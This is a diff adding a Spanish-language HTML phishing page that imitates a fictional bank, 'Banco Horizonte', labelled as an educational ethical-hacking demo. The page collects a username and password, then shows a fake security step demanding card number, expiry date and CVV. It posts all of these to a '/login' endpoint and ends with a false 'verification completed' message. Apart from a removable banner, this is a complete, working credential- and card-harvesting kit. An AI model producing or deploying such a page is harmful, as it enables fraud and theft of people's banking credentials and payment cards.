@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco Horizonte — Acceso (DEMO EDUCATIVA)</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px 0; }
+        .banner-demo { background: #de350b; color: white; text-align: center; padding: 10px; font-weight: bold; font-size: 13px; position: fixed; top: 0; left: 0; right: 0; z-index: 999; }
+        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.08); text-align: center; width: 340px; margin-top: 40px; }
+        h2 { color: #1a1a1a; margin-bottom: 20px; font-size: 22px; }
+        p { color: #666; font-size: 14px; line-height: 1.5; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ccc; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        input:focus { border-color: #0052cc; outline: none; }
+        button { background-color: #0052cc; color: white; border: none; padding: 12px; width: 100%; border-radius: 6px; cursor: pointer; font-size: 16px; font-weight: 600; margin-top: 10px; }
+        button:hover { background-color: #0040a3; }
+        .hidden { display: none; }
+        .footer { color: #999; font-size: 11px; margin-top: 25px; }
+        .exito { color: #00875a; font-size: 16px; font-weight: 600; margin-top: 20px; }
+        .verificando { color: #0052cc; font-size: 14px; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="banner-demo">⚠️ DEMO EDUCATIVA — NO ES UNA WEB REAL ⚠️</div>
+
+<div class="container">
+    <div id="login-form">
+        <h2>Banco Horizonte (ficticio)</h2>
+        <p style="font-size:13px; color:#999;">Portal de verificación de identidad</p>
+        <input type="text" id="username" placeholder="Usuario">
+        <input type="password" id="password" placeholder="Contraseña">
+        <button onclick="enviarLogin()">Ingresar</button>
+        <p id="msg-verificando" class="verificando hidden">Verificando seguridad...</p>
+    </div>
+
+    <div id="card-form" class="hidden">
+        <h2>Verificación adicional</h2>
+        <p style="font-size:13px;">Por seguridad, ingrese los datos de su tarjeta:</p>
+        <input type="text" id="tarjeta" placeholder="Número de tarjeta" maxlength="16">
+        <input type="text" id="vencimiento" placeholder="MM/AA" maxlength="5">
+        <input type="text" id="cvv" placeholder="CVV" maxlength="3">
+        <button onclick="enviarTarjeta()">Verificar</button>
+    </div>
+
+    <div id="exito-form" class="hidden">
+        <h2>✓ Verificación completada</h2>
+        <p>Su identidad ha sido verificada exitosamente.</p>
+        <p class="exito">Puede cerrar esta ventana.</p>
+    </div>
+
+    <div class="footer">Simulación educativa — Hacking Ético</div>
+</div>
+
+<script>
+    function enviarLogin() {
+        const usuario = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        if (!usuario || !password) {
+            alert('Complete todos los campos');
+            return;
+        }
+
+        enviarAlServidor('/login', {
+            usuario: usuario,
+            password: password,
+            token: 'sin-token',
+            tarjeta: '', vencimiento: '', cvv: ''
+        });
+
+        document.getElementById('msg-verificando').classList.remove('hidden');
+
+        setTimeout(() => {
+            document.getElementById('login-form').classList.add('hidden');
+            document.getElementById('card-form').classList.remove('hidden');
+        }, 2000);
+    }
+
+    function enviarTarjeta() {
+        enviarAlServidor('/login', {
+            usuario: document.getElementById('username').value,
+            password: document.getElementById('password').value,
+            token: 'sin-token',
+            tarjeta: document.getElementById('tarjeta').value,
+            vencimiento: document.getElementById('vencimiento').value,
+            cvv: document.getElementById('cvv').value
+        });
+
+        document.getElementById('card-form').classList.add('hidden');
+        document.getElementById('exito-form').classList.remove('hidden');
+    }
+
+    function enviarAlServidor(ruta, datos) {
+        fetch(ruta, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams(datos)
+        }).catch(err => console.log('Demo — envío en localhost'));
+    }
+</script>
+
+</body>
+</html>
